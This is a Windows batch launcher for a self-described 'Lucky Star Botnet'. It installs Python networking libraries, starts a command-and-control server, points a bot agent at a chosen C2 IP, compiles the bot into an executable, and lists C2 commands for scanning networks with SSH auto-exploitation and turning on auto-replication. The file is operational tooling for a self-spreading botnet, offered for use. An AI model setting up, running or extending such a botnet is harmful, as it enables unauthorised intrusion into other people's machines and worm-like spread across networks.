@echo off
color 0A
title Lucky Star Botnet - Quick Start

echo.
echo ========================================
echo   LUCKY STAR BOTNET - QUICK START
echo ========================================
echo.

REM Verificar si es primera vez
if not exist "cert.pem" (
    echo [*] Primera vez detectada. Configurando...
    echo.
    
    echo [1/3] Instalando dependencias...
    python -m pip install --quiet --upgrade pip
    python -m pip install --quiet paramiko netaddr cryptography scapy
    
    echo [2/3] Generando certificados SSL...
    python generate_certs.py
    
    echo [3/3] Configuracion completa!
    echo.
)

echo ========================================
echo   SELECCIONA UNA OPCION:
echo ========================================
echo.
echo   1. Iniciar C2 Server (Servidor de Control)
echo   2. Iniciar Bot (Agente)
echo   3. Compilar Bot a Ejecutable
echo   4. Demo Completo (C2 + Bot)
echo   5. Salir
echo.

set /p option="Opcion: "

if "%option%"=="1" (
    echo.
    echo [*] Iniciando C2 Server...
    python c2_commander.py
) else if "%option%"=="2" (
    echo.
    set /p c2_ip="IP del C2 Server [127.0.0.1]: "
    if "%c2_ip%"=="" set c2_ip=127.0.0.1
    
    REM Actualizar IP en el bot
    powershell -Command "(gc bot_soldier.py) -replace \"C2_IP = '.*'\", \"C2_IP = '%c2_ip%'\" | Out-File -encoding ASCII bot_soldier.py"
    
    echo [*] Iniciando Bot conectando a %c2_ip%...
    python bot_soldier.py
) else if "%option%"=="3" (
    echo.
    echo [*] Compilando bot a ejecutable...
    python compile_bot.py
    pause
) else if "%option%"=="4" (
    echo.
    echo [*] Iniciando C2 Server...
    start "Lucky Star C2" cmd /k "color 0C && python c2_commander.py"
    
    timeout /t 3 /nobreak >nul
    
    echo [*] Iniciando Bot...
    start "Lucky Star Bot" cmd /k "color 0A && python bot_soldier.py"
    
    echo.
    echo [+] Demo iniciado!
    echo [*] Ventana ROJA = C2 Server
    echo [*] Ventana VERDE = Bot
    echo.
    echo Comandos utiles en C2:
    echo   - recon 1       : Escanear red (auto-explota SSH)
    echo   - list 1        : Ver hosts encontrados
    echo   - auto_rep 1 on : Activar auto-replicacion
    echo   - status        : Ver bots conectados
    echo.
    pause
) else (
    exit
)
